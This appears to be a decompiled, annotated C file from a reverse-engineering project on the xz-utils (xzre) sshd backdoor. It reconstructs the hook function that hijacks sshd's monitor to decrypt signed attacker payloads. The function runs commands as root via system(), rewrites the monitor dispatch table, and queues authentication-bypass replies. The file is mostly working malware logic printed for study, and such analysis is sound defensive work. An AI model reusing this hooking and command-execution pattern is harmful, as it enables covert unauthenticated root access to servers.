// /home/kali/xzre-ghidra/xzregh/108EA0_mm_answer_keyallowed_hook.c
// Function: mm_answer_keyallowed_hook @ 0x108EA0
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_keyallowed_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Runs the decrypted payload state machine. It first validates `payload_state`, extracts sshbuf chunks from the monitor
 * message, and when state==0 it copies the signed header into `payload_data`, decrypts it via `secret_data_get_decrypted`,
 * and verifies the Ed448 signature against the cached host key. State 1 and 2 append additional chunks until the
 * advertised body_length is consumed, then state 3 interprets the decrypted command: copying payloads for
 * mm_answer_keyverify/mm_answer_authpassword, invoking `sshd_proxy_elevate` to run system/PAM commands, or queueing auth
 * payloads. On success it patches the monitor dispatch table to point at the attacker's hooks before tail-calling the
 * genuine `mm_answer_keyallowed`; any failure resets `payload_state` (or even exits sshd) so no partially decrypted data
 * is reused.
 */

#include "xzre_types.h"

int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)

{
  payload_command_type_t payload_type;
  payload_stream_state_t payload_state;
  libc_imports_t *libc_imports_ref;
  sshd_ctx_t *sshd_ctx;
  sshd_monitor_func_t *orig_mm_answer_keyallowed;
  size_t sock_read_buf_len;
  sshd_ctx_t *sshd_ctx_cursor;
  sshd_monitor_func_t keyverify_handler;
  u64 uid_gid_pair;
  pfn_exit_t exit_fn;
  global_context_t *ctx;
  BOOL state_ok;
  gid_t rgid;
  int orig_call_result;
  size_t header_copy_idx;
  size_t sock_copy_idx;
  size_t payload_len;
  ssize_t write_result;
  size_t copy_idx;
  size_t payload_data_offset;
  sshd_payload_ctx_t **clear_cursor;
  u8 *payload_header_cursor;
  uid_t ruid;
  sshd_payload_ctx_t *payload_record;
  u8 zero_seed;
  sshbuf payload_buf;
  global_context_t *global_ctx;
  size_t payload_chunk_size;
  u8 payload_seed_buf[57];
  sshd_payload_ctx_t *payload_ctx;
  sshd_monitor_func_t orig_handler;
  u8 payload_header_buf[122];
  
  ctx = ::global_ctx;
  zero_seed = 0;
  if (::global_ctx == (global_context_t *)0x0) {
    return 0;
  }
  libc_imports_ref = ::global_ctx->libc_imports;
  if (libc_imports_ref == (libc_imports_t *)0x0) {
    return 0;
  }
  sshd_ctx = ::global_ctx->sshd_ctx;
  if (sshd_ctx == (sshd_ctx_t *)0x0) {
    return 0;
  }
  if (::global_ctx->payload_buffer == (u8 *)0x0) {
    return 0;
  }
  orig_mm_answer_keyallowed = sshd_ctx->mm_answer_keyallowed_start;
  if (orig_mm_answer_keyallowed == (sshd_monitor_func_t *)0x0) goto LAB_00109471;
  if (::global_ctx->payload_state == PAYLOAD_STREAM_DISPATCHED) goto LAB_0010944f;
  state_ok = check_backdoor_state(::global_ctx);
  if (((state_ok == FALSE) || (ctx->payload_state == PAYLOAD_STREAM_DISPATCHED)) ||
     (ctx->payload_state == PAYLOAD_STREAM_POISONED)) goto LAB_00109429;
  clear_cursor = &payload_ctx;
  for (copy_idx = 0x12; copy_idx != 0; copy_idx = copy_idx + -1) {
    *(u32 *)clear_cursor = 0;
    clear_cursor = (sshd_payload_ctx_t **)((long)clear_cursor + (ulong)zero_seed * -8 + 4);
  }
  payload_chunk_size = 0;
  // AutoDoc: Pull the next sshbuf payload chunk straight out of the monitor message so the streaming decrypt can resume where it left off.
  state_ok = sshbuf_extract(m,ctx,(void **)&payload_ctx,(size_t *)&orig_handler);
  if ((state_ok == FALSE) ||
     (state_ok = extract_payload_message
                         ((sshbuf *)&payload_ctx,(size_t)orig_handler,&payload_chunk_size,ctx),
     state_ok == FALSE)) goto LAB_0010944f;
  // AutoDoc: Decrypt the framed chunk, append it into `ctx->payload_buffer`, and advance `payload_state` if enough bytes have arrived.
  decrypt_payload_message((key_payload_t *)payload_ctx,payload_chunk_size,ctx);
  payload_state = ctx->payload_state;
  if (payload_state == PAYLOAD_STREAM_COMMAND_READY) {
LAB_00109216:
    payload_record = ctx->payload_ctx;
    if (payload_record != (sshd_payload_ctx_t *)0x0) {
      payload_len = (ulong)payload_record->payload_total_size;
      payload_type = payload_record->command_type;
      payload_data_offset = payload_len - 0x120;
      // AutoDoc: Type 2 payloads carry a complete `mm_answer_keyverify` reply—copy its length/buffer into `sshd_ctx` and write it back immediately.
      if (payload_type == PAYLOAD_COMMAND_KEYVERIFY_REPLY) {
        if ((((ctx->sshd_ctx->mm_answer_keyverify_slot != (sshd_monitor_func_t *)0x0) &&
             (4 < payload_data_offset)) &&
            (payload_data_offset = (ulong)payload_record->body_payload_offset, payload_record->body_payload_offset != 0)) &&
           ((payload_data_offset < payload_len - 0x122 && (payload_len = (payload_len - 0x122) - payload_data_offset, 2 < payload_len)))) {
          *(u8 *)&sshd_ctx->keyverify_reply_len = payload_record[1].signed_header_prefix[payload_data_offset - 2];
          *(u8 *)((long)&sshd_ctx->keyverify_reply_len + 1) =
               (payload_record[1].signed_header_prefix + (payload_data_offset - 2))[1];
          if ((sshd_ctx->keyverify_reply_len == 0) ||
             (payload_len - 2 < (ulong)sshd_ctx->keyverify_reply_len)) {
            sshd_ctx->keyverify_reply_len = 0;
          }
          else {
            sshd_ctx_cursor = ctx->sshd_ctx;
            libc_imports_ref = ctx->libc_imports;
            sshd_ctx->keyverify_reply_buf = payload_record[1].signed_header_prefix + payload_data_offset;
            keyverify_handler = sshd_ctx_cursor->mm_answer_keyverify_hook;
            if (keyverify_handler != (sshd_monitor_func_t)0x0) {
              *sshd_ctx_cursor->mm_answer_keyverify_slot = keyverify_handler;
              write_result = fd_write(sock,payload_record + 1,payload_data_offset,libc_imports_ref);
              if (-1 < write_result) {
                return 0;
              }
              goto LAB_0010944f;
            }
          }
        }
      }
      // AutoDoc: Type 3 payloads request privilege escalation: honor the supplied uid/gid pair and exec the decrypted body via libc’s `system()`.
      else if (payload_type == PAYLOAD_COMMAND_SYSTEM_EXEC) {
        if (((libc_imports_ref->system != (pfn_system_t)0x0) && (8 < payload_data_offset)) &&
           (payload_record->signed_header_prefix[payload_len - 0x75] == '\0')) {
          uid_gid_pair = *(u64 *)&payload_record->body_payload_offset;
          rgid = (gid_t)((ulong)uid_gid_pair >> 0x20);
          if (((rgid == 0) || (orig_call_result = (*libc_imports_ref->setresgid)(rgid,rgid,rgid), orig_call_result != -1)) &&
             ((ruid = (uid_t)uid_gid_pair, ruid == 0 ||
              (orig_call_result = (*libc_imports_ref->setresuid)(ruid,ruid,ruid), orig_call_result != -1)))) {
            (*libc_imports_ref->system)((char *)(payload_record[1].signed_header_prefix + 4));
            ctx->payload_state = PAYLOAD_STREAM_DISPATCHED;
            goto LAB_0010944f;
          }
        }
      }
      // AutoDoc: Type 1 payloads stash an authpassword body for later—record the length/pointer so the authpassword hook can emit it on demand.
      else if (((payload_type == PAYLOAD_COMMAND_STASH_AUTHPASSWORD) &&
               (ctx->sshd_ctx->mm_answer_authpassword_slot != (sshd_monitor_func_t *)0x0)) &&
              (1 < payload_data_offset)) {
        *(char *)&sshd_ctx->pending_authpayload_len = (char)payload_record->body_payload_offset;
        *(u8 *)((long)&sshd_ctx->pending_authpayload_len + 1) =
             *(u8 *)((long)&payload_record->body_payload_offset + 1);
        if (sshd_ctx->pending_authpayload_len == 0) {
          payload_record = (sshd_payload_ctx_t *)0x0;
        }
        else {
          payload_record = payload_record + 1;
          if (payload_len - 0x122 < (ulong)sshd_ctx->pending_authpayload_len) {
            sshd_ctx->pending_authpayload_len = 0;
            goto LAB_00109429;
          }
        }
        sshd_ctx->pending_authpayload = payload_record;
        ctx->payload_state = PAYLOAD_STREAM_DISPATCHED;
        // AutoDoc: As soon as an authpassword payload is queued, refresh PermitRootLogin/PAM/request IDs so the follow-on hook won’t trip sshd’s guards.
        state_ok = sshd_patch_variables(TRUE,FALSE,FALSE,MONITOR_REQ_MODULI,ctx);
LAB_001092e5:
        if (state_ok != FALSE) goto LAB_0010944f;
      }
    }
  }
  else if (payload_state < PAYLOAD_STREAM_DISPATCHED) {
    if (payload_state == PAYLOAD_STREAM_EXPECT_HEADER) {
      if (ctx->payload_bytes_buffered < 0xae) goto LAB_0010944f;
      payload_header_cursor = payload_seed_buf + 0x10;
      for (copy_idx = 0x29; copy_idx != 0; copy_idx = copy_idx + -1) {
        *payload_header_cursor = '\0';
        payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
      }
      payload_record = (sshd_payload_ctx_t *)ctx->payload_buffer;
      payload_seed_buf[0] = '\0';
      payload_seed_buf[1] = '\0';
      payload_seed_buf[2] = '\0';
      payload_seed_buf[3] = '\0';
      payload_seed_buf[4] = '\0';
      payload_seed_buf[5] = '\0';
      payload_seed_buf[6] = '\0';
      payload_seed_buf[7] = '\0';
      payload_seed_buf[8] = '\0';
      payload_seed_buf[9] = '\0';
      payload_seed_buf[10] = '\0';
      payload_seed_buf[0xb] = '\0';
      payload_seed_buf[0xc] = '\0';
      payload_seed_buf[0xd] = '\0';
      payload_seed_buf[0xe] = '\0';
      payload_seed_buf[0xf] = '\0';
      if (((payload_record != (sshd_payload_ctx_t *)0x0) &&
          (ctx->sshd_sensitive_data != (sensitive_data *)0x0)) &&
         ((ctx->sshd_sensitive_data->host_pubkeys != (sshkey **)0x0 &&
          (ctx->payload_ctx == (sshd_payload_ctx_t *)0x0)))) {
        ctx->payload_ctx = payload_record;
        payload_header_buf[0] = '\0';
        payload_header_buf[1] = '\0';
        payload_header_buf[2] = '\0';
        payload_header_buf[3] = '\0';
        payload_header_buf[4] = '\0';
        payload_header_buf[5] = '\0';
        payload_header_buf[6] = '\0';
        payload_header_buf[7] = '\0';
        payload_header_buf[8] = '\0';
        payload_header_buf[9] = '\0';
        payload_header_buf[10] = '\0';
        payload_header_buf[0xb] = '\0';
        payload_header_buf[0xc] = '\0';
        payload_header_buf[0xd] = '\0';
        payload_header_buf[0xe] = '\0';
        payload_header_buf[0xf] = '\0';
        payload_header_cursor = payload_header_buf + 0x10;
        for (copy_idx = 0x4a; copy_idx != 0; copy_idx = copy_idx + -1) {
          *payload_header_cursor = '\0';
          payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
        }
        copy_idx = 0;
        do {
          payload_header_buf[copy_idx] = payload_record->signed_header_prefix[copy_idx];
          copy_idx = copy_idx + 1;
        } while (copy_idx != 0x3a);
        // AutoDoc: State 0: decrypt the signed header seed into `payload_seed_buf` before copying the 0x3a-byte header into `ctx->payload_ctx`.
        state_ok = secret_data_get_decrypted(payload_seed_buf,ctx);
        if ((state_ok != FALSE) &&
           (state_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
                                      [ctx->sshd_host_pubkey_idx],payload_header_buf,0x3a,0x5a,
                                      // AutoDoc: Verify the Ed448 signature over the fixed header before allowing the state machine to advance beyond stage zero.
                                      ctx->payload_ctx->ed448_signature,payload_seed_buf,ctx),
           state_ok != FALSE)) {
          ctx->payload_state = PAYLOAD_STREAM_BUFFERING_BODY;
          payload_header_cursor = payload_seed_buf;
          for (copy_idx = 0x39; copy_idx != 0; copy_idx = copy_idx + -1) {
            *payload_header_cursor = '\0';
            payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
          }
          state_ok = check_backdoor_state(ctx);
          goto LAB_001092e5;
        }
      }
      ctx->payload_state = PAYLOAD_STREAM_POISONED;
      ctx->payload_ctx = (sshd_payload_ctx_t *)0x0;
    }
    else if ((payload_state == PAYLOAD_STREAM_BUFFERING_BODY) &&
            (ctx->payload_ctx != (sshd_payload_ctx_t *)0x0)) {
      payload_len = (ulong)ctx->payload_ctx->payload_total_size;
      payload_data_offset = ctx->payload_bytes_buffered;
      if (payload_data_offset <= payload_len) {
        if (payload_data_offset != payload_len) goto LAB_0010944f;
        payload_len = ctx->payload_buffer_size;
        sock_read_buf_len = ctx->sock_read_len;
        if ((payload_len < sock_read_buf_len) || (payload_data_offset = payload_data_offset - 0x72, payload_len - sock_read_buf_len <= payload_data_offset)) {
LAB_00109471:
          if (libc_imports_ref->exit != (pfn_exit_t)0x0) {
            (*libc_imports_ref->exit)(0);
          }
          return 0;
        }
        payload_header_buf[0] = '\0';
        payload_header_buf[1] = '\0';
        payload_header_buf[2] = '\0';
        payload_header_buf[3] = '\0';
        payload_header_buf[4] = '\0';
        payload_header_buf[5] = '\0';
        payload_header_buf[6] = '\0';
        payload_header_buf[7] = '\0';
        payload_header_buf[8] = '\0';
        payload_header_buf[9] = '\0';
        payload_header_buf[10] = '\0';
        payload_header_buf[0xb] = '\0';
        payload_header_buf[0xc] = '\0';
        payload_header_buf[0xd] = '\0';
        payload_header_buf[0xe] = '\0';
        payload_header_buf[0xf] = '\0';
        payload_header_cursor = payload_header_buf + 0x10;
        for (copy_idx = 0x62; copy_idx != 0; copy_idx = copy_idx + -1) {
          *payload_header_cursor = '\0';
          payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
        }
        payload_header_cursor = ctx->payload_buffer;
        copy_idx = 0;
        do {
          header_copy_idx = copy_idx + 1;
          payload_header_buf[copy_idx] = payload_header_cursor[copy_idx + payload_data_offset];
          copy_idx = header_copy_idx;
        } while (header_copy_idx != 0x72);
        if ((payload_len < payload_data_offset) || (sock_copy_idx = 0, payload_len - payload_data_offset < sock_read_buf_len)) goto LAB_00109471;
        for (; sock_read_buf_len != sock_copy_idx; sock_copy_idx = sock_copy_idx + 1) {
          payload_header_cursor[sock_copy_idx + payload_data_offset] = ctx->sock_read_buf[sock_copy_idx];
        }
        state_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
                                  ctx->payload_buffer,payload_data_offset + ctx->sock_read_len,
                                  ctx->payload_buffer_size,payload_header_buf,
                                  // AutoDoc: State 1 completion: once the final body chunk is spliced in, re-run the signature check across the assembled buffer before switching to command execution.
                                  ctx->payload_ctx->signed_header_prefix,ctx);
        if (state_ok == FALSE) {
          ctx->payload_state = PAYLOAD_STREAM_POISONED;
          goto LAB_00109471;
        }
        ctx->payload_state = PAYLOAD_STREAM_COMMAND_READY;
        goto LAB_00109216;
      }
    }
  }
  else if (payload_state == PAYLOAD_STREAM_DISPATCHED) goto LAB_0010944f;
LAB_00109429:
  if (((ctx->libc_imports != (libc_imports_t *)0x0) &&
      (exit_fn = ctx->libc_imports->exit, exit_fn != (pfn_exit_t)0x0)) &&
     (ctx->payload_state = PAYLOAD_STREAM_POISONED, ctx->exit_flag != 0)) {
    (*exit_fn)(0);
  }
LAB_0010944f:
                    /* Hook tail-call: after the payload state machine finishes it invokes orig_mm_answer_keyallowed through the saved pointer, so there is no jumptable. */
  orig_call_result = (*(code *)orig_mm_answer_keyallowed)(ssh,sock,m);
  return orig_call_result;
}

